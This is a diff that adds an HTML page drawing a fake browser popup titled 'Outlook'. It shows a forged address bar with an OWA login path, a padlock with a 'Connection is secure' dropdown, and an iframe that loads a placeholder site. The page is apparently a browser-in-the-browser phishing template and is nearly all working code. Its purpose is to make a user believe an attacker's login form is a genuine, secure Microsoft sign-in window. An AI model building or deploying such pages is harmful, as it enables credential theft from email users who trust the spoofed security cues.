@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Outlook</title>
+  <link rel = "icon" type = "image/png" href = "./images/favicon.ico">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      user-select: none;
+      overflow: hidden;
+      background-color: #fff;
+    }
+
+    #window {
+      position: absolute;
+      top: 50px;
+      left: 50px;
+      width: calc(100vw - 100px);
+      height: calc(100vh - 100px);
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+      border-radius: 8px;
+      overflow: hidden;
+      background: #fff;
+      border: 1px solid #ccc;
+    }
+
+    #title-bar-width {
+      width: 100%;
+    }
+
+    #title-bar {
+      height: 30px;
+      background: linear-gradient(to bottom, #f0f0f0, #e0e0e0);
+      border-bottom: 1px solid #ccc;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 10px;
+    }
+
+    #title-bar>div {
+      display: flex;
+      align-items: center;
+    }
+
+    #logo-description {
+      font-size: 14px;
+      color: #333;
+      margin-left: 5px;
+    }
+
+    #minimize,
+    #square,
+    #exit {
+      padding: 5px 10px;
+      margin-left: 5px;
+      border-radius: 4px;
+      color: black;
+      /* X, square, and dash are now black */
+      font-weight: bold;
+      cursor: default;
+      transition: background-color 0.2s ease;
+    }
+
+    #minimize img,
+    #square img,
+    #exit img {
+      width: 16px;
+      height: 16px;
+      vertical-align: middle;
+    }
+
+    #minimize:hover {
+      background-color: rgba(0, 0, 0, 0.1);
+    }
+
+    #square:hover {
+      background-color: rgba(0, 0, 0, 0.1);
+    }
+
+    #exit {
+      background-color: transparent;
+    }
+
+    #exit:hover {
+      background-color: #E81123;
+    }
+
+    #url-bar {
+      height: 30px;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      padding: 0 10px;
+      border-bottom: 1px solid #eee;
+      position: relative;
+    }
+
+    #ssl-padlock {
+      margin-right: 5px;
+      cursor: pointer;
+    }
+
+    #domain-name, #domain-path {
+      margin: 0; /* Remove default margin */
+    }
+
+    #domain-name {
+      font-size: 14px;
+      color: #333;
+    }
+
+    #domain-path {
+      font-size: 14px;
+      color: #777;
+      margin-left: 5px;
+    }
+
+    #content {
+      width: 100%;
+      height: calc(100% - 60px);
+      border: none;
+    }
+
+    /* SSL Certificate Dropdown */
+    #ssl-dropdown {
+      display: none;
+      position: absolute;
+      top: 100%;
+      left: 0;
+      background-color: #fff;
+      color: #333;
+      border-radius: 4px;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+      padding: 10px;
+      width: 250px;
+      z-index: 1000;
+    }
+
+    #ssl-dropdown ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    #ssl-dropdown li {
+      padding: 8px 10px;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+      display: flex;
+      align-items: center;
+    }
+
+    #ssl-dropdown li:hover {
+      background-color: #eee;
+    }
+
+    #ssl-dropdown li img {
+      width: 16px;
+      height: 16px;
+      margin-right: 5px;
+      vertical-align: middle;
+    }
+
+    #ssl-dropdown li .arrow-right {
+      margin-left: auto;
+    }
+	
+	#domain-name, #domain-path {
+    margin: 0;
+}
+  </style>
+</head>
+
+<body>
+  <div id="window">
+    <div id="title-bar-width">
+      <div id="title-bar">
+        <div>
+          <img src="./images/favicon.ico" width="15px" height="15px" id="logo">
+          <span id="logo-description">Outlook</span>
+        </div>
+        <div>
+          <span id="minimize"><img src="./images/minus-sign.png" alt="Minimize"></span>
+          <span id="square"><img src="./images/maxi.png" alt="Maximize"></span>
+          <span id="exit"><img src="./images/close.png" alt="Exit"></span>
+        </div>
+      </div>
+      <div id="url-bar">
+        <img src="./images/ssl.svg" width="20px" height="20px" id="ssl-padlock">
+        <span id="domain-name">https://domain.com</span>
+        <span id="domain-path">/owa/auth/login.aspx</span>
+        <div id="ssl-dropdown">
+          <ul>
+            <li><img src="./images/ssl2.svg" alt="Lock"> Connection is secure <img src="./images/arrow-point-to-right.png" alt="Arrow" class="arrow-right"></li>
+            <li><img src="./images/cookies.svg" alt="Cookies"> Cookies and site data <img src="./images/arrow-point-to-right.png" alt="Arrow" class="arrow-right"></li>
+            <li><img src="./images/settings.svg" alt="Settings"> Site settings <img src="./images/arrow-point-to-right.png" alt="Arrow" class="arrow-right"></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <iframe id="content" src="https://fake.com" frameBorder="0"></iframe>
+  </div>
+
+  <script>
+    var minimize = document.getElementById("minimize");
+    var square = document.getElementById("square");
+    var exit = document.getElementById("exit");
+    var titleBar = document.getElementById("title-bar");
+    var sslPadlock = document.getElementById("ssl-padlock");
+    var sslDropdown = document.getElementById("ssl-dropdown");
+
+    // Make window draggable
+    titleBar.addEventListener('mousedown', function (e) {
+      var window = document.getElementById('window');
+      var initialX = e.clientX - window.offsetLeft;
+      var initialY = e.clientY - window.offsetTop;
+
+      function moveWindow(e) {
+        window.style.left = (e.clientX - initialX) + 'px';
+        window.style.top = (e.clientY - initialY) + 'px';
+      }
+
+      document.addEventListener('mousemove', moveWindow);
+      document.addEventListener('mouseup', function () {
+        document.removeEventListener('mousemove', moveWindow);
+      });
+    });
+
+    // Window resize functionality
+    var isMaximized = false;
+    square.addEventListener('click', function () {
+      var window = document.getElementById('window');
+      if (isMaximized) {
+        window.style.width = 'calc(100vw - 100px)';
+        window.style.height = 'calc(100vh - 100px)';
+      } else {
+        window.style.width = '80vw';
+        window.style.height = '80vh';
+      }
+      isMaximized = !isMaximized;
+    });
+
+    // SSL Dropdown Toggle
+    sslPadlock.addEventListener('mouseover', () => {
+      sslDropdown.style.display = 'block';
+    });
+
+    sslPadlock.addEventListener('mouseout', () => {
+      sslDropdown.style.display = 'none';
+    });
+  </script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</body>
+</html>
